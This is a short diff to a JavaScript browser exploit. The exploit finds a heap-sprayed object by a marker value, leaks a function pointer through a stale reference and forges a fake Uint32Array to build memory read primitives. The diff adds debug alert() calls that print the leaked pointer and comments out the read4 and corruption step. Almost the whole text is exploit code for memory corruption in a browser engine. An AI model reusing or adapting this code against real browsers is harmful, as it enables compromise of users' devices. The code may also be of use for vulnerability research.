@@ -193,9 +193,12 @@ function dgc() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
  			if (bufs[i][k] == 0x41414242) { 
+				alert("Found the object!!");
+				
  				// Leak function pointer
 				stale[0] = fc;
  				fcp = bufs[i][k];
+				alert("Leaked function pointer:" + fcp)
 				
 				// Make a fake Uint32Array
  				stale[0] = {
@@ -225,6 +228,7 @@ function dgc() {
 				bufs[i][k] += 0x10; 
 				
 				
+				/*
  				bck = stale[0][4];
  				stale[0][4] = 0; // address, low 32 bits
  				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
@@ -233,16 +237,17 @@ function dgc() {
  				mem1 = bck;
  				mem2 = smsh;
  				bufs.push(stale)
-				/*
-				 function read4(addr) {
- 					mem0[4] = addr;
- 					var ret = mem2[0];
- 					mem0[4] = mem1;
- 					return ret;
-				 }*/
+				
+				//function read4(addr) {
+ 				//mem0[4] = addr;
+ 				//var ret = mem2[0];
+ 				//mem0[4] = mem1;
+ 				//return ret;
+				//}
  				if (smsh.length != 0x10) {
  					smashed(stale[0]);
  				}
+				*/
  				return;
  			}
  		}
